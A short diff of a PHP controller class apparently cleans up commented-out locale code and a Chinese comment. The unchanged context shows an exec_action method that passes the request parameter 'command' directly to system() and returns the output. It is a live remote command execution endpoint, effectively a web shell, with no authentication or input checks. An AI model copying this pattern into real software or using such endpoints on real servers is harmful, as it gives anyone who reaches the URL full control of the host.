@@ -23,16 +23,10 @@ class Index
         return $ans;
     }
     public function exec_action(Request $request){
-//        header('Content-Type: text/html; charset=utf-8');
-//        $locale='zh_CN.UTF-8';
-//        setlocale(LC_ALL,$locale);
-//        putenv('LC_ALL='.$locale);
         $command=$_REQUEST["command"];
 //        dump($command);
         system($command,$out);
-//        return "这是一段中文";
 
-//        dump();//读取文件内容
         return $out;
 
     }
